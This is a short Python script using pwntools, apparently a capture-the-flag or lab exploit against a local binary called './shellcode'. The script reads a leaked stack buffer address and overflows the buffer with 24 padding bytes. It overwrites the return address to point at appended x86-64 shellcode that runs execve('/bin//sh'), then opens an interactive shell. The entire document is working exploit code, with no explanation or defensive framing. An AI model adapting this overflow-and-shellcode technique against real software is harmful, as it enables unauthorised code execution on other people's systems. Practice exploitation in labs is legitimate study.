from pwn import *
import re

p = process('./shellcode')
p.recvline()
bufaddr = p.recvline()
bufaddr = int(re.split("[\[\]]", bufaddr)[1][2:], 16)

shellcode = "\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"

shelladdr = p64(bufaddr + 24 + 8)

payload = 'A' * 24 + shelladdr + shellcode

p.sendline(payload)
p.interactive()
